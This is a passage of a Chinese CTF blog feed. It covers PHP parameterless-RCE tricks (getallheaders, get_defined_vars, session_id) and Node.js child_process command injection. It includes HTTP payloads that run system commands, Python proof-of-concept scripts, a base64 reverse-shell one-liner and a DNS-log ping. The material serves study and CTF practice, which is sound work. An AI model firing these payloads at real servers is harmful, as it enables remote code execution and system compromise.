b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b然后post传入   _=phpinfo();</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121210330927.png" alt="image-20221121210330927"></p><h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。<br> <strong>没有参数的函数</strong>什么意思？一般该类题目代码如下(或类似)：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);header(&quot;Content-Type: text/html; charset=utf-8&quot;);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    eval($_GET[&#39;code&#39;]);&#125;</code></pre><p>先来解读下代码：</p><pre><code>如果&#39;;&#39;===preg_replace(...)，那么就执行exp传递的命令\ : 转义字符不多说了[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）</code></pre><p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。</p><p>(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>先来整理下经常需要用到的函数吧，后面会说具体使用:</p><pre><code class="php">目录操作:getchwd() //函数返回当前工作目录。scandir() //函数返回指定目录中的文件和目录的数组。dirname() //函数返回路径中的目录部分。chdir() //函数改变当前的目录。数组操作:pos()     //current() 的别名reset()  //将数组的内部指针指向第一个单元end()     //将内部指针指向数组中的最后一个元素，并输出。next() //函数将内部指针指向数组中的下一个元素，并输出。prev()  //将数组内部指针倒回一位。each()  //返回当前元素的键名和键值，并将内部指针向前移动array_reverse()以相反的元素顺序返回数组。array_rand() 函数返回数组中的随机键名(也就是下标)，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。    读取文件操作:readfile() //输出一个文件。readgzfile()show_source()highlight_file()   //打印输出或者返回 filename 文件中语法高亮版本的代码。file_get_contents ()    其它函数:localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。current(localeconv())永远都是个点chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。localeconv() 函数返回一包含本地数字及货币格式信息的数组。    phpversion()返回php版本，如7.3.5floor(phpversion())返回7sqrt(floor(phpversion()))返回2.6457513110646tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..//floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整    chr(ord(hebrevc(crypt(phpversion()))))`返回`.  //hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符//crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。//hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</code></pre><h2 id="dirname-amp-chdir"><a href="#dirname-amp-chdir" class="headerlink" title="dirname() &amp; chdir()"></a>dirname() &amp; chdir()</h2><p>这个方法并不可以rce，只是可以完成读取文件的操作，事实上在很多情况下已经够用了</p><p>想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录</p><pre><code class="php">var_dump(getcwd());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174021764.png" alt="image-20221122174021764"></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可</p><pre><code class="php">var_dump(scandir(getcwd()));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174107093.png" alt="image-20221122174107093"></p><p>如果getcwd()无法使用呢?</p><p>我们知道localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p>我们可构造出:</p><pre><code class="php">var_dump(scandir(current(localeconv())));  //var_dump也可以用print_r代替var_dump(scandir(pos(localeconv())));var_dump(scandir(reset(localeconv())));var_dump(scandir(chr(current(localtime(time()))))); //chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于&quot;.&quot;所以使用chr(time())，一个周期必定出现一次&quot;.&quot; 我爆破了1w次，雀氏有可行性哈哈，不过雀氏有点小离谱var_dump(scandir(chr(ord(hebrevc(crypt(time())))))); //hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));  if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); //设置当前工作路径为根目录，然后遍历此目录</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175238708.png" alt="  "></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175828251.png" alt="image-20221122175828251"></p><p>如何进行目录上跳呢？我们用<code>dirname()</code>即可</p><pre><code class="php">var_dump(scandir(dirname(getcwd())));</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174205898.png" alt="image-20221122174205898"></p><p>那么怎么更改我们的当前目录呢？使用<code>chdir</code></p><pre><code>chdir(dirname(getcwd()));  //将当前目录设置为上一级目录</code></pre><p>搭配chadir来读取文件:</p><pre><code class="php">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><p>再给出其它一些读取文件的操作:</p><pre><code class="php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));以上两个都是随机获取的其实，看脸,它们的作用都是随机选取一个根目录的文件进行读取</code></pre><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders"></a>getallheaders</h2><p>只适用于apache中间件</p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122143753491.png" alt="image-20221122143753491" style="zoom:67%;"><p>我们来打印出来看看</p><pre><code>http://127.0.0.1/index.php?code=var_dump(getallheaders());</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144238099.png" alt="image-20221122144238099"></p><p>它把我们的header头输出了，但是header头我们是可以自定义的</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144525537.png" alt="image-20221122144525537"></p><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144718307.png" alt="image-20221122144718307"></p><p>我们来使用一下，可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p><pre><code class="php">var_dump(implode(getallheaders()));sakura: flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144928146.png" alt="image-20221122144928146"></p><p>来执行命令:</p><pre><code class="php">GET /index.php?code=eval(implode(getallheaders())); HTTP/1.1sakura: system(whoami);//</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122145432187.png" alt="image-20221122145432187"></p><p>事实上这样操作具有局限性，万一我们输出的头不再最开始不就g了?</p><p>但是我们有很多函数可以去帮我们去获得我们想要的字符串</p><p>由于在开头第一个我们还可以使用pos函数去得到我们输入的命令</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150157102.png" alt="image-20221122150157102"></p><p>假如说它的位置不在数组第一个，在最后一个呢?</p><p>我们只需要使用end就可以把它取出来，这里我输入的值位置并不在第一个，所以取出来并没有用，只是做个示范罢了</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150850290.png" alt="image-20221122150850290"></p><p>那么相信大家已经会了，现在我们如何取数组第二个呢?</p><p>相信大家心里已经有了答案，使用next!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122151030098.png" alt="image-20221122151030098"></p><p>就是这样，搭配不同的函数取出我们想要的值即可</p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？这里我们可以使用get_defined_vars()</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122154832676.png" alt="image-20221122154832676"></p><p>该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与<code>implode</code>结合起来用。将<code>get_defined_vars()</code>的结果用<code>var_dump()</code>输出结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155240401.png" alt="image-20221122155240401"></p><p>发现其可以回显全局变量:</p><pre><code>$_GET$_POST$_FILES$_COOKIE</code></pre><p>可以看到用GET传入的参数会被显示在数组中的第一位,不过这里有这么多的数组，我们也不需要全部查看,只需要使用<code>current()</code>函数就可以取到我们想要的东西</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155556428.png" alt="image-20221122155556428"></p><p>我们来试一试:</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155713268.png" alt="image-20221122155713268"></p><p>给我们返回了一个一维数组，我们再想办法取得第二个值:</p><pre><code class="php">GET /index.php?code=var_dump(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155831177.png" alt="image-20221122155831177"></p><p>然后就可以来执行命令</p><pre><code class="php">GET /index.php?code=eval(next(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161512219.png" alt="image-20221122161512219"></p><p>除了next还可以使用end</p><pre><code class="php">GET /index.php?code=eval(end(current(get_defined_vars())));&amp;sakura=system(whoami); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161858843.png" alt="image-20221122161858843"></p><p>但一般网站喜欢对</p><pre><code>$_GET$_POST$_COOKIE</code></pre><p>做全局过滤，所以我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传</p><pre><code class="python">import requestsfrom io import BytesIOpayload = &quot;system(&#39;ls /tmp&#39;);&quot;.encode(&#39;hex&#39;)files = &#123;  payload: BytesIO(&#39;sky cool!&#39;)&#125;r = requests.post(&#39;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files=files, allow_redirects=False)print r.content</code></pre><p>注意:上面这个脚本只适用于$_FILES在最后的情况，要根据条件不用去修改其位置</p><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164305081.png" alt="image-20221122164305081"></p><p>官方说：<code>session_id()</code>可以用来获取/设置当前会话 ID。<br> 那么可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。<br> 但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164407079.png" alt="image-20221122164407079"></p><p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。</p><p>所以，payload可以为：</p><pre><code class="php">eval(hex2bin(session_id(session_start())));  //hex(&quot;phpinfo();&quot;)=706870696e666f28293b</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164738128.png" alt="image-20221122164738128"></p><p>顺便给出一个poc:</p><pre><code class="python">import requestsurl = &#39;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#39;payload = &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)cookies = &#123;    &#39;PHPSESSID&#39;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content</code></pre><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv"></a>getenv</h2><p><strong>只适用于php7.1以后版本</strong></p><p>通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。</p><p>查阅php手册，有非常多的超全局变量</p><pre><code class="php">$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV</code></pre><p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122165153813.png" alt="image-20221122165153813"></p><p>我们来打印一下吧:</p><pre><code class="php">GET /index.php?code=var_dump(getenv()); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170631213.png" alt="image-20221122170631213"></p><p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/2019-03-29-13-47-19.png" alt="img"></p><p>我们来试一下:</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(getenv())); </code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170911592.png" alt="image-20221122170911592"></p><p>但是我们不想要下标，我们想要下标的值，该怎么办呢?</p><pre><code class="php">GET /index.php?code=var_dump(array_rand(array_flip(getenv()))); HTTP/1.1</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122171114135.png" alt="image-20221122171114135"></p><p>我们这么写达到了什么效果呢?—&gt;随机获取一个环境变量的值</p><p>我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数</p><p>说实话我个人对这种做法还是比较懵逼，我并没有找到好的方法去执行命令，我观看了网上的文章都是到这一步就停下了，唯一达到的效果就是执行了phpinfo()?其实也不必要这么麻烦的</p><pre><code class="php">POST /index.php?code=var_dump(getenv(phpinfo())); HTTP/1.1</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="rce" scheme="https://sakurahack-y.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs漏洞总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-20T06:32:10.000Z</published>
    <updated>2022-11-20T10:03:47.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h1><h2 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h2><pre><code class="plsql">toUpperCase()toLowerCase()</code></pre><p> 对于toUpperCase(): 字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”<br>对于toLowerCase(): 字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)  </p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h3 id="大小比较"><a href="#大小比较" class="headerlink" title="大小比较"></a>大小比较</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.log(&#39;asd&#39;&gt;1); //false</code></pre><p> 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false  </p><h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><pre><code class="plsql">console.log([]==[]); //false console.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //true console.log([100,2]&lt;&#39;test&#39;); //true console.log([1,2]&lt;&#39;2&#39;);  //true console.log([11,16]&lt;&quot;10&quot;); //false</code></pre><p> 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较  </p><h3 id="还有一些比较特别的相等："><a href="#还有一些比较特别的相等：" class="headerlink" title="还有一些比较特别的相等："></a>还有一些比较特别的相等：</h3><pre><code class="plsql">console.log(null==undefined) // 输出：true console.log(null===undefined) // 输出：false console.log(NaN==NaN)  // 输出：false console.log(NaN===NaN)  // 输出：false</code></pre><h2 id="变量拼接："><a href="#变量拼接：" class="headerlink" title="变量拼接："></a>变量拼接：</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56 console.log(&quot;5&quot;+[6,6]); //56,6 console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</code></pre><h2 id="MD5的绕过"><a href="#MD5的绕过" class="headerlink" title="MD5的绕过"></a>MD5的绕过</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</code></pre><p>a[x]=1&amp;b[x]=2<br>数组会被解析成**[object Object]      **</p><pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;b=&#123;&#39;x&#39;:&#39;2&#39;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) a=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p><h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><p>我们可以使用反引号替代括号执行函数，可以用反引号替代单引号双引号，可以在反引号内插入变量。<br>但是有一点我们需要注意，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到${}时，字符串会被分割。</p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log(&quot;hello %s&quot;,yake);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log`hello$&#123;yake&#125;world`;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></pre><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></pre><h3 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></pre><h1 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。  </p><pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookieconsole.log(&quot;document.cookie&quot;); //输出document.cookie</code></pre><p><strong>我们来搭建一个服务测试一下</strong></p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/&#39;,function(req,res)&#123;    res.send(eval(req.query.a));console.log(req.query.a);&#125;)app.listen(1234);console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);</code></pre><p> Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令<br><strong>1.exec()</strong><br> 启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。实际使用可以不加回调函数。  </p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>我们可以看到成功执行了命令<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>我们可以进行反弹shell的操作:</strong></p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre><p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，<br>则可以使用global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)来执行命令</p><p><strong>2.spawn()</strong><br> 启动一个子进程来执行命令。spawn (命令，{shell:true})。需要开启命令执行的指令。  </p><pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> 与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件  </p><pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);</code></pre><p>此时是假设我们已经上传了evil.js文化,我们就可以用fork去执行<br>如我们在evil.js中代码如下:</p><pre><code class="plsql">console.log(&quot;hello hacker&quot;);</code></pre><p>我们此时访问这个网站</p><pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);</code></pre><p>如图，命令被成功执行了<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> 启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。  </p><pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>注意点:</strong></p><ol><li>**<em>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性</em>**，设置超时时间， 一旦创建的进程运行超过设定的时间将会被杀死。</li><li>exec()与execFile()不同的是，**<em>exec()适合执行已有的命令，execFile()适合执行文件</em>**。</li></ol><p><strong>后面几个函数的利用方法也是调用上述介绍的四种方法,这里就不再赘述!</strong></p><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setTimeout(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)，该函数的作用是每个两秒执行一次代码。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setInterval(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h2 id="文件读写"><a href="#文件读写" class="headerlink" 